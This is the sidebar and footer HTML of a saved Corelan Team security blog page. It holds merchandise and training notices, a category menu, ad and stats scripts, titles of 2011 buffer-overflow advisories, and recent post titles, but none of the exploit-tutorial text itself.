    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Corelan Team Merchandise</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">			<div class="textwidget">You can support Corelan Team by donating or purchasing items from <b><a href="http://www.cafepress.com/CorelanTeam">the official Corelan Team merchandising store.</a></b><a href="http://www.cafepress.com/CorelanTeam"> <br><center><img src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/corelanmerchandise.png"></center></a><br>
<br>
<b>Corelan Team Wallpaper / Exploit dev cheatsheet : <a href="http://redmine.corelan.be:8800/projects/corelanart/files">Download here</a></b><br></div>
				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_text" id="text-5">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Corelan Live training</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">			<div class="textwidget">Starting in 2011, Corelan will be teaching live win32 exploit dev bootcamp classes at various security cons. <br><br>You can read more about the training and schedules <b><a href="http://www.corelan.be/index.php/security/corelan-training/">here</a></b></div>
				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_text" id="text-4">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Stay posted</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">			<div class="textwidget"><ul><b><li><a href="http://www.corelan.be/index.php/subscribe-via-email">Subscribe to posts via email</a></li><li><a href="https://twitter.com/corelanc0d3r">Follow me on twitter</a></li></b></ul></div>
				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_categories" id="categories-3">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Categories</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body"><select name="cat" id="cat" class="postform">
	<option value="-1">Select Category</option>
	<option class="level-0" value="6">001_Security</option>
	<option class="level-1" value="1164">&nbsp;&nbsp;&nbsp;Cons and Seminars</option>
	<option class="level-1" value="1037">&nbsp;&nbsp;&nbsp;Exploit Writing Tutorials</option>
	<option class="level-1" value="803">&nbsp;&nbsp;&nbsp;Exploits</option>
	<option class="level-1" value="1373">&nbsp;&nbsp;&nbsp;Malware and Reversing</option>
	<option class="level-1" value="1257">&nbsp;&nbsp;&nbsp;Papers</option>
	<option class="level-1" value="1492">&nbsp;&nbsp;&nbsp;Pentesting</option>
	<option class="level-1" value="1456">&nbsp;&nbsp;&nbsp;Video</option>
	<option class="level-1" value="1236">&nbsp;&nbsp;&nbsp;Web Application Security</option>
	<option class="level-0" value="10">Active Directory</option>
	<option class="level-0" value="283">Certificates</option>
	<option class="level-0" value="241">Cisco</option>
	<option class="level-0" value="224">Development</option>
	<option class="level-0" value="124">Juniper</option>
	<option class="level-0" value="8">Linux and Unix</option>
	<option class="level-0" value="12">MS Exchange</option>
	<option class="level-0" value="11">My Free Tools</option>
	<option class="level-0" value="5">Networking</option>
	<option class="level-0" value="13">OpsMgr</option>
	<option class="level-0" value="105">Outlook</option>
	<option class="level-0" value="34">Private</option>
	<option class="level-0" value="465">Scripts</option>
	<option class="level-1" value="466">&nbsp;&nbsp;&nbsp;Powershell</option>
	<option class="level-0" value="4">Sharepoint</option>
	<option class="level-0" value="9">Storage</option>
	<option class="level-0" value="1">Uncategorized</option>
	<option class="level-0" value="15">Virtualization</option>
	<option class="level-0" value="14">Windows Client OS</option>
	<option class="level-0" value="7">Windows Server</option>
	<option class="level-0" value="353">Wordpress</option>
</select>

<script type="text/javascript">
/* <![CDATA[ */
	var dropdown = document.getElementById("cat");
	function onCatChange() {
		if ( dropdown.options[dropdown.selectedIndex].value > 0 ) {
			location.href = "https://www.corelan.be/?cat="+dropdown.options[dropdown.selectedIndex].value;
		}
	}
	dropdown.onchange = onCatChange;
/* ]]> */
</script>

		<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><script type="text/javascript"><!--
google_ad_client = "ca-pub-8134501503628637";
/* Sidebar */
google_ad_slot = "4006062044";
google_ad_width = 160;
google_ad_height = 600;
//-->
</script>
<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/show_ads.js">
</script><ins style="display:inline-table;border:none;height:600px;margin:0;padding:0;position:relative;visibility:visible;width:160px"><ins id="aswift_3_anchor" style="display:block;border:none;height:600px;margin:0;padding:0;position:relative;visibility:visible;width:160px"><iframe allowtransparency="true" frameborder="0" height="600" hspace="0" marginwidth="0" marginheight="0" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){i+=&#39;.call&#39;;setTimeout(h,0)}else if(h.match){i+=&#39;.nav&#39;;w.location.replace(h)}s.log&amp;&amp;s.log.push(i)}" scrolling="no" vspace="0" width="160" id="aswift_3" name="aswift_3" style="left:0;position:absolute;top:0;"></iframe></ins></ins>
          <div class="cleared"></div>
        </div>
    </div>
</div>
<div class="cleared"></div>
    <div class="art-footer">
                <div class="art-footer-t"></div>
                <div class="art-footer-l"></div>
                <div class="art-footer-b"></div>
                <div class="art-footer-r"></div>
                <div class="art-footer-body">
                    <div class="art-content-layout">
    <div class="art-content-layout-row">
					<div class="art-layout-cell art-layout-cell-size2">
							<div class="art-center-wrapper">
				<div class="art-center-inner">
						
			<div class="art-block widget widget_rss" id="rss-3">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t"><a class="rsswidget" href="http://www.corelan.be/index.php/forum/?forum=security-advisories&xfeed=forum&feedkey=9bafe4d8-36ae-4c6c-9bb2-68d012ccedca" title="Syndicate this content"><img style="border:0" width="14" height="14" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/rss.png" alt="RSS"></a> <a class="rsswidget" href="https://www.corelan.be/index.php/forum/security-advisories/" title=":: Knowledge is not an object, it&#39;s a flow ::">Corelan Security Advisories</a></h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body"><ul><li><a class="rsswidget" href="https://www.corelan.be/index.php/forum/security-advisories/corelan-11-004-mjm-core-multimedia-suite-2011-2-4-stack-buffer-overflow-s3m/#p6335" title="Advisory        : CORELAN-11-004 Disclosure date : April 30, 2011 URL : http://www.corelan.be/advisories.php?id=CORELAN-11-004   00 : Vulnerability information Product : MJM Core Multimedia Suite (Core Player) Version : 2.4 (2011) Vendor : MJM Soft URL :  http://www.mjm.net.tf/ Platform : Windows XP, Vista, Windows 7 Type of vulnerability : Stack Buffer Over […]">rick2600 on CORELAN-11-004 - MJM Core Multimedia Suite 2011 (2.4) Stack Buffer Overflow (.s3m)</a> <span class="rss-date">April 30, 2011</span></li><li><a class="rsswidget" href="https://www.corelan.be/index.php/forum/security-advisories/corelan-11-003-mjm-quickplayer-2-3-2010-stack-buffer-overflow-s3m/#p6334" title="Advisory        : CORELAN-11-003 Disclosure date : April 30, 2011 URL : http://www.corelan.be/advisories.php?id=CORELAN-11-003   00 : Vulnerability information Product : MJM Quickplayer Version : 2.3 (2010) Vendor : MJM Soft URL :  http://www.mjm.net.tf/ Platform : Windows XP, Vista, Windows 7 Type of vulnerability : Stack Buffer Overflow Risk rating : Mediu […]">rick2600 on CORELAN-11-003 - MJM Quickplayer 2.3 (2010) Stack Buffer Overflow (.s3m)</a> <span class="rss-date">April 30, 2011</span></li><li><a class="rsswidget" href="https://www.corelan.be/index.php/forum/security-advisories/corelan-11-002-magix-music-maker-16-stack-buffer-overflow/#p6323" title="Media : http://www.darkreading.com/vulnerability-management/16790102.....g-law.html http://www.theregister.co.uk/2011/04/29/security_researcher_.....hreatened/ http://forums.theregister.co.uk/forum/1/2011/04/29/security_.....hreatened/ http://topsy.com/www.theregister.co.uk/2011/04/29/security_r.....hreatened/ http://www.techeye.net/security/security-expert- […]">Peter Van Eeckhoutte on CORELAN-11-002 - Magix Music Maker 16 Stack Buffer overflow</a> <span class="rss-date">April 28, 2011</span></li><li><a class="rsswidget" href="https://www.corelan.be/index.php/forum/security-advisories/corelan-11-002-magix-music-maker-16-stack-buffer-overflow/#p6316" title="Advisory        : CORELAN-11-002 Disclosure date : April 26, 2011 URL : http://www.corelan.be/advisories.php?id=CORELAN-11-002 OSVDB : 72455 00 : Vulnerability information Product : Magix Music Maker 16 Version : 16.0.2.4 Vendor : Magix AG URL :  http://www.magix.com/ Platform : Windows XP, Vista, Windows 7 Type of vulnerability : Stack Buffer Overflow Risk  […]">Corelan Team (acidgen) on CORELAN-11-002 - Magix Music Maker 16 Stack Buffer overflow</a> <span class="rss-date">April 26, 2011</span></li><li><a class="rsswidget" href="https://www.corelan.be/index.php/forum/security-advisories/corelan-11-001-verytools-videospirit-pro-1-70-stack-buffer-overflow/#p6237" title="Advisory        : CORELAN-11-001 Disclosure date : April 11, 2011 URL : http://www.corelan.be/advisories.php?id=CORELAN-11-001   00 : Vulnerability information Product : Video Spirit Pro/Lite Version : Pro: 1.7.0 Vendor : Verytools URL :  http://www.verytools.com/ Platform : Windows XP, Vista, Windows 7 Type of vulnerability : Stack Buffer overflow Risk rati […]">Peter Van Eeckhoutte on CORELAN-11-001 - VeryTools Videospirit Pro 1.70 Stack Buffer Overflow</a> <span class="rss-date">April 11, 2011</span></li></ul>		<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div>							</div>
				</div>
				
				<div class="cleared"> </div>
			</div>
						<div class="art-layout-cell art-layout-cell-size2">
							<div class="art-center-wrapper">
				<div class="art-center-inner">
						
			<div class="art-block widget widget_recent_entries" id="recent-posts-3">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Recent posts</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">						<ul>
				<li><a href="https://www.corelan.be/index.php/2011/07/27/metasploit-bounty-the-good-the-bad-and-the-ugly/" title="Metasploit Bounty – the Good, the Bad and the Ugly">Metasploit Bounty – the Good, the Bad and the Ugly</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/07/23/installing-watobo-on-backtrack-5/" title="Installing Watobo on BackTrack 5">Installing Watobo on BackTrack 5</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/" title="mona.py – the manual">mona.py – the manual</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/07/12/rop-your-way-into-b-sides-las-vegas-2011/" title="ROP your way into B-Sides Las Vegas 2011">ROP your way into B-Sides Las Vegas 2011</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/" title="Universal DEP/ASLR bypass with msvcr71.dll and mona.py">Universal DEP/ASLR bypass with msvcr71.dll and mona.py</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/06/16/mona-1-0-released/" title="Mona 1.0 released !">Mona 1.0 released !</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/05/12/hack-notes-ropping-eggs-for-breakfast/" title="Hack Notes : Ropping eggs for breakfast">Hack Notes : Ropping eggs for breakfast</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/04/03/hitb-2011-ctf-reversing-vectored-exception-handling-veh/" title="HITB 2011 CTF – Reversing Vectored Exception Handling (VEH)">HITB 2011 CTF – Reversing Vectored Exception Handling (VEH)</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/03/30/honeynet-workshop-2011/" title="Honeynet Workshop 2011">Honeynet Workshop 2011</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/03/22/pastenum-pastebinpastie-enumeration-tool/" title="Pastenum – Pastebin/pastie enumeration tool">Pastenum – Pastebin/pastie enumeration tool</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/03/18/blackhat-europe-2011-day-02/" title="BlackHat Europe 2011 / Day 02">BlackHat Europe 2011 / Day 02</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/03/17/blackhat-europe-2011-day-01/" title="BlackHat Europe 2011 / Day 01">BlackHat Europe 2011 / Day 01</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/03/16/blackhat-europe-2011-preview/" title="BlackHat Europe 2011 / Preview">BlackHat Europe 2011 / Preview</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/03/14/codegate-2011-ctf-binary200-anti-debugging-techniques/" title="Codegate 2011 CTF – Binary200 – Anti Debugging Techniques Explained">Codegate 2011 CTF – Binary200 – Anti Debugging Techniques Explained</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/02/27/cheat-sheet-installing-snorby-2-2-with-apache2-and-suricata-with-barnyard2-on-ubuntu-10-x/" title="Cheat sheet : Installing Snorby 2.2 with Apache2 and Suricata with Barnyard2 on Ubuntu 10.x">Cheat sheet : Installing Snorby 2.2 with Apache2 and Suricata with Barnyard2 on Ubuntu 10.x</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/02/27/anti-debugging-tricks-revealed-defcon-ctf-qualifications-2009-bin300-analysis/" title="Anti-debugging tricks revealed – Defcon CTF Qualifications 2009: Bin300 Analysis">Anti-debugging tricks revealed – Defcon CTF Qualifications 2009: Bin300 Analysis</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/01/31/the-honeypot-incident-how-strong-is-your-uf-reversing-fu/" title="The Honeypot Incident – How strong is your UF (Reversing FU)">The Honeypot Incident – How strong is your UF (Reversing FU)</a></li>
				<li><a href="https://www.corelan.be/index.php/2011/01/30/hack-notes-rop-retnoffset-and-impact-on-stack-setup/" title="Hack Notes : ROP retn+offset and impact on stack setup">Hack Notes : ROP retn+offset and impact on stack setup</a></li>
				<li><a href="https://www.corelan.be/index.php/2010/12/14/solarwinds/" title="Case Study: SolarWinds Orion (video)">Case Study: SolarWinds Orion (video)</a></li>
				<li><a href="https://www.corelan.be/index.php/2010/11/18/malicious-pdf-analysis-from-price-zip-to-flashplayer-exe/" title="Malicious pdf analysis : from price.zip to flashplayer.exe">Malicious pdf analysis : from price.zip to flashplayer.exe</a></li>
				</ul>
				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div>							</div>
				</div>
				
				<div class="cleared"> </div>
			</div>
					
    </div>
</div>
	                    <a href="https://www.corelan.be/index.php/feed/" class="art-rss-tag-icon" title="Corelan Team RSS Feed"></a>
                  <div class="art-footer-text">
                      <br><br>Copyright Peter Van Eeckhoutte © 2007 - 2011 | All Rights Reserved | <a href="http://www.corelan.be/index.php/terms-of-use/">Terms of use</a><br><a href="http://www.webutation.net/go/review/corelan.be"><img style="border:0;" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/corelan.be.png" alt="corelan.be"></a><br>			<!-- Added by Peter Van Eeckhoutte -->
		       <font size="-6">Your IP address : 79.97.131.123<br>			<!-- End Add -->
                  </font></div><font size="-6">
            		<div class="cleared"></div>
                </font></div><font size="-6">
            </font></div><font size="-6">
    		<div class="cleared"></div>
        </font></div><font size="-6">
    </font></div><font size="-6">
    <div class="cleared"></div>
    <p class="art-page-footer"></p>
</font></div><font size="-6">
    <div id="wp-footer">
	        <script type="text/javascript">
/* <![CDATA[ */
var thickboxL10n = {
	next: "Next &gt;",
	prev: "&lt; Prev",
	image: "Image",
	of: "of",
	close: "Close"
};
try{convertEntities(thickboxL10n);}catch(e){};
/* ]]> */
</script>
<script type="text/javascript" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/thickbox.js"></script>
<!-- begin visitor maps  -->
<script type="text/javascript">
//<![CDATA[
function wo_map_console(url) {
  window.open(url,"wo_map_console","height=650,width=800,toolbar=no,statusbar=no,scrollbars=yes").focus();
}
//]]>
</script>
<!-- end visitor maps -->
		<!-- Advertising Manager v3.4.19 (1.048 seconds.) -->

<script type="text/javascript">
var tb_pathToImage = "https://www.corelan.be/wp-includes/js/thickbox/loadingAnimation.gif";
var tb_closeImage = "https://www.corelan.be/wp-includes/js/thickbox/tb-close.png";
</script>
<!--stats_footer_test--><script src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/e-201135.js" type="text/javascript"></script><script src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/quant.js" type="text/javascript"></script>
<script type="text/javascript">
st_go({blog:'15427359',v:'ext',post:'2196'});
var load_cmc = function(){linktracker_init(15427359,2196,2);};
if ( typeof addLoadEvent != 'undefined' ) addLoadEvent(load_cmc);
else load_cmc();
</script><img id="wpstats" src="./Exploit writing tutorial part 4   From Exploit to Metasploit – The basics   Corelan Team_files/g.gif" alt="">
	        <!-- 73 queries. 1.049 seconds. -->
    </div>


<!--
Hyper cache file: e387fec408b30caef56a7dc05c671554
Cache created: 03-09-2011 21:45:29
 --></font></body></html>